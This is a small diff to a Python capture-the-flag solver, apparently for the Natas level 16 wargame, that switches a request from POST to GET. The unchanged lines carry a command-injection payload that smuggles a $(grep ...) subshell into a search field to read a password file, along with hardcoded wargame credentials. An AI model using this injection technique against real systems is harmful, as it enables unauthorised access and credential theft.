@@ -31,7 +31,7 @@ def find_chars(url:str, chars):
     for char in characters:
         string =  {'needle' : f'$(grep -E [a-zA-Z0-9]*{char} /etc/natas_webpass/natas17)'}
 
-        response = requests.post(url=url, params=string, auth=("natas16","TRD7iZrd5gATjj9PkPEuaOlfEjHqj32V"))
+        response = requests.get(url=url, params=string, auth=("natas16","TRD7iZrd5gATjj9PkPEuaOlfEjHqj32V"))
         r=response.text
         char_match= re.search("[a-zA-Z]*African",r)
         print(char_match)
